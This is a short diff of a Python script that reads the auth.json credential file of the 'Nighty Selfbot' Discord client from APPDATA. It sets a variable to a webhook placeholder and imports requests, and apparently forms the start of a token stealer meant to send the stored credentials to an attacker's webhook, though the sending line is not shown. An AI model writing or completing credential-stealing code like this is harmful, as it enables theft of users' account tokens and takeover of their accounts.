@@ -2,7 +2,7 @@ import os
 import json
 import requests
 
-Sendy = ''
+Sendy = 'webhook here'
 
 Pathy = os.path.join(os.environ['APPDATA'], 'Nighty Selfbot', 'auth.json')
 with open(Pathy, 'r') as file:
